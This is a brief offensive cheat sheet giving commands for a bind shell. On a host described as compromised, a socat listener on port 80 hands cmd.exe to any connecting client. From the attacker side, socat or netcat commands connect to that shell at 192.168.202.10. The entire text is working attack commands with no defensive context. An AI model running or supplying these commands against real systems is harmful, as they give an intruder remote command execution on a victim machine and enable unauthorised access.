# 1) spawn bind shell on compromised host
```bat
set LPORT=80
socat TCP4-LISTEN:%LPORT%,fork EXEC:cmd.exe,pipes
```

# 2) Connect to remote bind shell
```sh
RHOST=192.168.202.10
RPORT=80
socat - TCP4:$RHOST:$RPORT
```

or

```sh
RHOST=192.168.202.10
RPORT=80
nc -nv $RHOST $RPORT
```
